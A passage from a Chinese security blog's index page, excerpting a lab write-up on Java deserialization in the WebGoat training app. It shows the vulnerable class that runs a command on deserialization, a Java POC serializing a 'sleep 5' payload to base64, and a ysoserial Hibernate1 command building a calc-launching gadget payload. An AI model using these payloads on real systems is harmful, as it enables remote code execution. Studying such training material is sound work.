<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">log</span> <span class="operator">=</span> LoggerFactory.getLogger(VulnerableTaskHolder.class);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">2L</span>;</span><br><span class="line">    <span class="keyword">private</span> String taskName;</span><br><span class="line">    <span class="keyword">private</span> String taskAction;  <span class="comment">// taskAction字符串</span></span><br><span class="line">    <span class="keyword">private</span> LocalDateTime requestedExecutionTime;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">VulnerableTaskHolder</span><span class="params">(String taskName, String taskAction)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.taskName = taskName;</span><br><span class="line">        <span class="built_in">this</span>.taskAction = taskAction;</span><br><span class="line">        <span class="built_in">this</span>.requestedExecutionTime = LocalDateTime.now();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;VulnerableTaskHolder [taskName=&quot;</span> + <span class="built_in">this</span>.taskName + <span class="string">&quot;, taskAction=&quot;</span> + <span class="built_in">this</span>.taskAction + <span class="string">&quot;, requestedExecutionTime=&quot;</span> + <span class="built_in">this</span>.requestedExecutionTime + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 重写了readObject</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream stream)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        stream.defaultReadObject();</span><br><span class="line">        log.info(<span class="string">&quot;restoring task: &#123;&#125;&quot;</span>, <span class="built_in">this</span>.taskName);</span><br><span class="line">        log.info(<span class="string">&quot;restoring time: &#123;&#125;&quot;</span>, <span class="built_in">this</span>.requestedExecutionTime);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.requestedExecutionTime != <span class="literal">null</span> &amp;&amp; (<span class="built_in">this</span>.requestedExecutionTime.isBefore(LocalDateTime.now().minusMinutes(<span class="number">10L</span>)) || <span class="built_in">this</span>.requestedExecutionTime.isAfter(LocalDateTime.now()))) &#123;</span><br><span class="line">            log.debug(<span class="built_in">this</span>.toString());</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;outdated&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// taskAction满足以sleep或ping开头且长度小于22时，就会将taskAction中的内容以系统命令来执行</span></span><br><span class="line">            <span class="keyword">if</span> ((<span class="built_in">this</span>.taskAction.startsWith(<span class="string">&quot;sleep&quot;</span>) || <span class="built_in">this</span>.taskAction.startsWith(<span class="string">&quot;ping&quot;</span>)) &amp;&amp; <span class="built_in">this</span>.taskAction.length() &lt; <span class="number">22</span>) &#123;</span><br><span class="line">                log.info(<span class="string">&quot;about to execute: &#123;&#125;&quot;</span>, <span class="built_in">this</span>.taskAction);</span><br><span class="line">                <span class="comment">// 执行（Runtime）</span></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="built_in">this</span>.taskAction);</span><br><span class="line">                    <span class="comment">// 从进程的标准输出流中读取数据</span></span><br><span class="line">                    <span class="type">BufferedReader</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(p.getInputStream()));</span><br><span class="line">                    <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                    <span class="comment">// 这个循环会逐行读取进程的标准输出，并将每一行打印到控制台</span></span><br><span class="line">                    <span class="keyword">while</span>((line = in.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                        log.info(line);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var5) &#123;</span><br><span class="line">                    log.error(<span class="string">&quot;IO Exception&quot;</span>, var5);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="编写POC"><a href="#编写POC" class="headerlink" title="编写POC"></a>编写POC</h3><p>VulnerableTaskHolder中不需要的删掉</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// VulnerableTaskHolder</span></span><br><span class="line"><span class="keyword">package</span> org.dummy.insecure.framework;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.time.LocalDateTime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnerableTaskHolder</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String taskName;</span><br><span class="line">    <span class="keyword">private</span> String taskAction;</span><br><span class="line">    <span class="keyword">private</span> LocalDateTime requestedExecutionTime;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">VulnerableTaskHolder</span><span class="params">(String taskName,String taskAction)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.taskName = taskName;</span><br><span class="line">        <span class="built_in">this</span>.taskAction = taskAction;</span><br><span class="line">        <span class="built_in">this</span>.requestedExecutionTime = LocalDateTime.now();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>package需要相同，不然会造成Serializable ID不一致</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// poc</span></span><br><span class="line"><span class="keyword">package</span> org.dummy.insecure.framework;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">VulnerableTaskHolder</span> <span class="variable">vth</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VulnerableTaskHolder</span>(<span class="string">&quot;sleep&quot;</span>,<span class="string">&quot;sleep 5&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(vth);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">byte</span>[] exploit = baos.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(exploit);</span><br><span class="line">        System.out.println(<span class="string">&quot;payload=&quot;</span> + payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h3><h4 id="hibernate-core-5-4-28-Final-jar"><a href="#hibernate-core-5-4-28-Final-jar" class="headerlink" title="hibernate-core-5.4.28.Final.jar"></a>hibernate-core-5.4.28.Final.jar</h4><p>将文件 hibernate-core-5.4.28.Final.jar 放在和 ysoserial-all.jar 同一个目录，弹计算器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java8 -Dhibernate5 -cp hibernate-core-5.4.28.Final.jar;ysoserial-all.jar ysoserial.GeneratePayload Hibernate1 calc &gt; poc.bin</span><br></pre></td></tr></table></figure>
+
+<p>装个多个Java版本，java8是修改了java执行文件名</p>
+<h4 id="bin转16进制和base64"><a href="#bin转16进制和base64" class="headerlink" title="bin转16进制和base64"></a>bin转16进制和base64</h4><p><strong>python</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">out</span>(<span class="params">file</span>):</span><br><span class="line">    f = <span class="built_in">open</span>(file, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">    <span class="built_in">print</span>(file + <span class="string">&quot;:&quot;</span> + <span class="string">&quot;\n&quot;</span> + <span class="string">&quot;16进制格式为：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(f.<span class="built_in">hex</span>() + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    f_b64 = base64.b64encode(f)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;base64格式为：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(f_b64) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    out(<span class="string">&quot;poc.bin&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>Java</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileConversion</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> <span class="string">&quot;ser.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] fileBytes = Files.readAllBytes(Paths.get(filePath));</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">hexString</span> <span class="operator">=</span> bytesToHex(fileBytes);</span><br><span class="line">            System.out.println(filePath + <span class="string">&quot;:\n16进制格式为：\n&quot;</span> + hexString);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(fileBytes);</span><br><span class="line">            System.out.println(<span class="string">&quot;Base64格式为：\n&quot;</span> + base64String);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">bytesToHex</span><span class="params">(<span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">hexString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">byte</span> b : bytes) &#123;</span><br><span class="line">            hexString.append(String.format(<span class="string">&quot;%02x&quot;</span>, b));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> hexString.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+	
+	</div>
+  <a type="button" href="/2023/11/10/Java/Java反序列化-WebGoat/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+
+		</div>
+
+		<!-- pagination -->
+		<div>
+  		<center>
+		<div class="pagination">
+
+   
+    
+     <a href="/page/13/" type="button" class="btn btn-default"><i class="fa fa-arrow-circle-o-left"></i> Prev</a>
+      
+
+        <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+ 
+       <a href="/page/15/" type="button" class="btn btn-default ">Next<i class="fa fa-arrow-circle-o-right"></i></a>     
+        
+
+  
+</div>
+
+  		</center>
+		</div>
+
+		
+		
+	</div> <!-- col-md-9 -->
+
+	
+		<div class="col-md-3">
+	<div id="sidebar">
+	
+			
+  <div id="site_search">
+   <div class="form-group">
+    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
+   </div>  
+  <div id="local-search-result"></div>
+  </div>
+
+
+		
+			
+	<div class="widget">
+		<h4>Categories</h4>
+		<ul class="tag_box inline list-unstyled">
+		
+			<li><a href="/categories/Java/">Java<span>12</span></a></li>
+		
+			<li><a href="/categories/Pentest/">Pentest<span>10</span></a></li>
+		
+			<li><a href="/categories/Pollution/">Pollution<span>2</span></a></li>
+		
+			<li><a href="/categories/SSRF/">SSRF<span>1</span></a></li>
+		
+			<li><a href="/categories/Tool/">Tool<span>1</span></a></li>
+		
+			<li><a href="/categories/Vuln/">Vuln<span>3</span></a></li>
+		
+			<li><a href="/categories/Writeup/">Writeup<span>2</span></a></li>
+		
+		</ul>
+	</div>
+
+		
+			
+	<div class="widget">
+		<h4>Tag Cloud</h4>
+		<ul class="tag_box inline list-unstyled">		
+		
+			<li><a href="/tags/CommonsCollections/">CommonsCollections<span>5</span></a></li>
+		
+			<li><a href="/tags/CISCN/">CISCN<span>1</span></a></li>
+		
+			<li><a href="/tags/tunnel/">tunnel<span>1</span></a></li>
+		
+			<li><a href="/tags/RMI/">RMI<span>1</span></a></li>
+		
+			<li><a href="/tags/Shiro/">Shiro<span>1</span></a></li>
+		
+			<li><a href="/tags/JNDI/">JNDI<span>1</span></a></li>
+		
+			<li><a href="/tags/ssrf/">ssrf<span>1</span></a></li>
+		
+			<li><a href="/tags/Python/">Python<span>1</span></a></li>
+		
+			<li><a href="/tags/Log4j2/">Log4j2<span>1</span></a></li>
+		
+			<li><a href="/tags/Node-js/">Node.js<span>1</span></a></li>
+		
+			<li><a href="/tags/JavaScript/">JavaScript<span>1</span></a></li>
+		
+			<li><a href="/tags/HTB/">HTB<span>10</span></a></li>
+		
+			<li><a href="/tags/Fastjson/">Fastjson<span>1</span></a></li>
+		
+			<li><a href="/tags/Java-Deserialize/">Java Deserialize<span>5</span></a></li>
+		
+		 
+		</ul>
+	</div>
+
+
+		
+			
+<div class="widget">
+  <h4>Recent Posts</h4>
+  <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2024/09/12/Tool/ligolo-ng/" ><i class="fa fa-file-o"></i>Ligolo-ng Note</a>
+      </li>
+    
+      <li>
+        <a href="/2024/08/02/Pentest/HTB/HTB Runner/" ><i class="fa fa-file-o"></i>HTB Runner</a>
+      </li>
+    
+      <li>
+        <a href="/2024/07/31/Pentest/HTB/HTB SolarLab/" ><i class="fa fa-file-o"></i>HTB SolarLab</a>
+      </li>
+    
+      <li>
+        <a href="/2024/07/26/Pentest/HTB/HTB IClean/" ><i class="fa fa-file-o"></i>HTB IClean</a>
+      </li>
+    
+      <li>
+        <a href="/2024/07/24/Pentest/HTB/HTB TwoMillion/" ><i class="fa fa-file-o"></i>HTB TwoMillion</a>
+      </li>
+    
+  </ul>
+</div>
+
+		
+			
+<div class="widget">
+	<h4>Links</h4>
+	<ul class="blogroll list-unstyled">
+	
+		<li><i class="false"></i><a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" title="" target="_blank"]);">hexo-theme-bithack</a></li>
+	
+	</ul>
+</div>
+
+
+		
+	</div> <!-- sidebar -->
+</div> <!-- col-md-3 -->
+
+	
+	
+</div> <!-- row-fluid -->
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 n2ryx's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+   </html>
